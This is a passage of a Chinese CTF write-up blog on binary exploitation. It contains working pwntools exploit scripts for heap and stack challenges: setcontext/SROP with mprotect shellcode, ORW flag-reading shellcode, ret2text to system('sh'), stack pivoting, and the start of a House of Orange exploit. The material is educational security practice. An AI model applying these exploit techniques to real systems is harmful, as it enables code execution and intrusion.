punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> heap<span class="token operator">>></span><span class="token number">12</span>heap <span class="token operator">=</span> heap<span class="token operator">*</span><span class="token number">0x1000</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># leak libc</span>show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc_mainarena_312 <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x0a\x31'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc_mainarena_312 <span class="token operator">-</span> <span class="token number">312</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token comment"># 7</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment"># 9</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># unlink 6-8 (include 7)</span><span class="token comment"># gdb.attach(p)</span>add<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token comment">#6</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">#8</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">-</span><span class="token number">18244200</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"setcontext+53:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>newexe <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi'''</span> <span class="token operator">%</span> newexeframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexeframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shell1<span class="token punctuation">)</span><span class="token punctuation">)</span>shell2 <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shell2<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于setcontext的orw"><a href="#关于setcontext的orw" class="headerlink" title="关于setcontext的orw"></a>关于setcontext的orw</h3><p>对于一般开启和沙箱和保护全开的题目,利用这种操作orw最方便</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>setcontext主要内容如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&lt;setcontext&gt;:   push   rdi&lt;setcontext+1&gt;: lea    rsi,[rdi+0x128]&lt;setcontext+8&gt;: xor    edx,edx&lt;setcontext+10&gt;:    mov    edi,0x2&lt;setcontext+15&gt;:    mov    r10d,0x8&lt;setcontext+21&gt;:    mov    eax,0xe&lt;setcontext+26&gt;:    syscall&lt;setcontext+28&gt;:    pop    rdi&lt;setcontext+29&gt;:    cmp    rax,0xfffffffffffff001&lt;setcontext+35&gt;:    jae    0x7ffff7a54bc0 &lt;setcontext+128&gt;&lt;setcontext+37&gt;:    mov    rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;:    fldenv [rcx]&lt;setcontext+46&gt;:    ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;:    mov    rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;:    mov    rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;:    mov    rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;:    mov    r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;:    mov    r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;:    mov    r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;:    mov    r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;:    mov    rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;:    push   rcx&lt;setcontext+95&gt;:    mov    rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;:    mov    rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;:   mov    rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;:   mov    r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;:   mov    r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;:   mov    rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;:   xor    eax,eax&lt;setcontext+127&gt;:   ret&lt;setcontext+128&gt;:   mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78&lt;setcontext+135&gt;:   neg    eax&lt;setcontext+137&gt;:   mov    DWORD PTR fs:[rcx],eax&lt;setcontext+140&gt;:   or     rax,0xffffffffffffffff&lt;setcontext+144&gt;:   ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般我们设法调用setcontext+53(避开ldmxcsr DWORD PTR [rdi+0x1c0]并利用下面的操作修改寄存器)</p><p>这个利用方式有点类似SROP，setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，而我们利用pwntools的SigreturnFrame可以更方便地进行赋值，只要把该SigreturnFrame写入一个chunk中，free它就能达到目的<br>我们这里考虑使用mprotect先赋予一段内存写的权限</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> new_addrframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当mprotect执行完时，rsp指向__free_hook+0x10，其中的值为__free_hook+0x18，这样我们就执行了第一段shellcode，这段shellcode的目的是往指定内存中读入shellcode并跳过去执行<br>我们第二段shellcode如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mov rax<span class="token punctuation">,</span> <span class="token number">0x67616c662f2e</span> <span class="token punctuation">;</span><span class="token operator">//</span> <span class="token punctuation">.</span><span class="token operator">/</span>flagpush raxmov rdi<span class="token punctuation">,</span> rsp <span class="token punctuation">;</span><span class="token operator">//</span> <span class="token punctuation">.</span><span class="token operator">/</span>flagmov rsi<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> O_RDONLYxor rdx<span class="token punctuation">,</span> rdx <span class="token punctuation">;</span>mov rax<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_opensyscallmov rdi<span class="token punctuation">,</span> rax <span class="token punctuation">;</span><span class="token operator">//</span> fdmov rsi<span class="token punctuation">,</span>rsp  <span class="token punctuation">;</span>mov rdx<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token punctuation">;</span><span class="token operator">//</span> nbytesmov rax<span class="token punctuation">,</span><span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_readsyscallmov rdi<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token operator">//</span> fdmov rsi<span class="token punctuation">,</span> rsp <span class="token punctuation">;</span><span class="token operator">//</span> bufmov rdx<span class="token punctuation">,</span> rax <span class="token punctuation">;</span><span class="token operator">//</span> countmov rax<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_writesyscallmov rdi<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> error_codemov rax<span class="token punctuation">,</span> <span class="token number">60</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段shellcode使用orw的方法读取flag</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在构造之前，我们需要指定机器的运行模式。<code>context.arch = &#39;amd64&#39; 或 &#39;i386&#39;</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> setcontext之后执行的值frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> <span class="token number">3</span>个参数frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> rip执行完之后执行的值frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般利用方式:</p><ol><li>将<code>setcontext+53</code>写入<code>__free_hook</code>，<code>__free_hook+0x8</code>写入一个<code>__free_hook+0x10</code>，后面写<code>read;jmp rsi</code>的<code>shellcode</code>。</li><li>构造<code>frame</code>，rip设置成<code>mprotect</code>，准备将<code>__free_hook&amp;0xfffffffffffff000</code>之后的连续0x1000区域权限设置成7。找一个堆块存放<code>frame</code>。</li><li>释放存放<code>frame</code>的<code>chunk</code>，此时执行到<code>read</code>。</li><li>将事先准备好的<code>getflag</code>的<code>shellcode</code>发送到服务器，即执行<code>shellcode</code>，得到flag。</li></ol><p>脚本模板:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">newexe <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi'''</span> <span class="token operator">%</span> newexeframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexeframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">1</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>shell2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''mov rax,0x67616c662fpush raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>setcontext利用:</p><p><a href="https://surager.pub/_posts/2020-06-27-%E4%BB%8EDASCTF6%E6%9C%88%E8%B5%9B%E4%B8%AD%E5%AD%A6%E4%B9%A0setcontext%E7%BB%95%E8%BF%87seccomp/">从DASCTF6月赛中学习setcontext绕过seccomp · Surager</a></p><p><a href="http://wafuter.jxustctf.top/2020/06/27/DASCTF-pwn-%E5%A4%8D%E7%8E%B0/">DASCTF pwn 复现 | pwxc’s blog (jxustctf.top)</a></p><p><a href="https://www.codenong.com/cs105709145/">BUUCTF-PWN rctf_2019_babyheap（house of storm，堆SROP） | 码农家园 (codenong.com)</a></p><h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>32位简单栈溢出,没啥好说的</p><p>ret2text, 没有偏移且有system函数和bss段上有sh字符串</p><p>直接运行system(sh) 即可getshell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./BabyRop'</span><span class="token punctuation">)</span><span class="token comment"># p = remote('192.168.38.235',11000)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x080491D6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804C029</span><span class="token punctuation">)</span><span class="token comment">#sh字符串</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p>栈溢出 stack pivoting</p><p>属于是基础不牢,比赛当天都没看出来漏洞实在是太low了(</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在admin里read_passwd可以最多读入30个字节,而&amp;passwd在栈上只有0x5个字节</p><p>存在栈溢出.且未开启NX保护</p><p>但是栈溢出字节较少,考虑使用stack pivoting</p><p>在栈上覆盖一个sys_read的系统调用,之后覆盖ret为jmp_rsp,之后就是写上jmp rsp之后执行的代码</p><p>这里我们抬高rsp到前面的sys_read,在call sys_read</p><p>执行sys_read之前修改rsi到sysread之后去方便执行orw</p><h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h3><p>这里我们发现有一个可以直接跳转到 rsp 的 gadgets。那么可以布置 payload 如下</p><pre class="line-numbers language-none"><code class="language-none">shellcode|padding|fake ebp|jmp_rsp|set rsp point to shellcode and jmp esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么我们 payload 中的最后一部分改如何设置 rsp 呢，可以知道</p><ul><li>size(shellcode+padding+fake ebp)=13</li><li>size(p64(jmp_rsp))=8</li></ul><p>所以我们最后一段需要执行的指令就是</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">sub rsp,0x15jmp rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./nologin"</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x004016fb</span> <span class="token comment"># jmp rsp</span>code1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""add rsi,0x31;push 0x70;pop rdx;xor rax,rax;syscall;"""</span><span class="token punctuation">)</span>sub_jmp_rsp<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""sub rsp,0x15;jmp rsp;"""</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> code1<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>nop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span><span class="token operator">+</span>sub_jmp_rspp<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">password:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>orw <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>nop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021祥云杯pwn题复现</title>
      <link href="//post/pwn-2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0.html"/>
      <url>//post/pwn-2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="2021祥云杯pwn部分"><a href="#2021祥云杯pwn部分" class="headerlink" title="2021祥云杯pwn部分"></a>2021祥云杯pwn部分</h1><p>萌新学了一年pwn终于可以在一些比赛上有点比赛体验了QWQ</p><p>可还就是整出半个note和一个lemon，剩下的都没有时间看了，完全靠ayoung大佬带飞（</p><span id="more"></span><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>House of Orange泄露libc，realloc_hook打one_gadget</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>没有free函数可以使用，由于是libc-2.23,考虑到使用House of Orange技术构造unsortedbin来泄露libc。</p><p>且正好格式化字符串可以构造任意地址写，add功能会泄露新申请的chunk的地址，可以推算出top chunk的size位地址，故可用格式化字符串来改小top chunk的size。</p><p>由于libc-2.23的top chunk的size只需要满足内容页对齐，且申请的size必须小于0x100，所以需要把top chunk的size修改小于0x100的值，为了满足内存页对齐，size位的后三位不可修改，所以修改前调整size位的倒数第3位为0，之后只要把从倒数第3为开始的更高位都修改为0，即可构造House of Orange。</p><p>具体调整为申请14个0x100的chunk，在申请一个0x40的chunk，即可把top chunk的size位修改为0x200d1，</p><p>这样我们利用格式化字符串漏洞修改top chunk的size为0x000d1，再申请一个比0xd1大的chunk，原top chunk就会被释放进入unsorted bin，fd和bk就会被填充上libc的地址。</p><p><img src="https://pic.imgdb.cn/item/6124b73744eaada73946c350.jpg"></p><p>之后再申请一个chunk，利用show打印残留的信息即可泄露libc真实地址</p><p>在这里仔细审计代码可以发现add功能可以输入size = 0，不会破坏残留的内容，完整泄露地址</p><p>之后直接修改malloc_hook为one_gadget不可用，即可想到通过realloc来调节栈帧，使用realloc的主要思路为：</p><pre class="line-numbers language-none"><code class="language-none">malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过尝试发现，将：</p><p>realloc_hook ==&gt; one_gadget</p><p>malloc_hook ==&gt; realloc+12</p><p>即可getshell，之后就是格式化字符串修改，要注意的是，格式化字符串最好一字节一字节（byte的形式）修改，不然会出现奇奇怪怪的问题，同时note这题的格式化字符串利用是scanf，区别于一般的printf，利用scanf的时候修改后的结果需要再次输入那么多的字节以继续完成scanf操作，具体可见exp。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">)</span><span class="token comment"># p = remote('47.104.70.90',25315)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">say</span><span 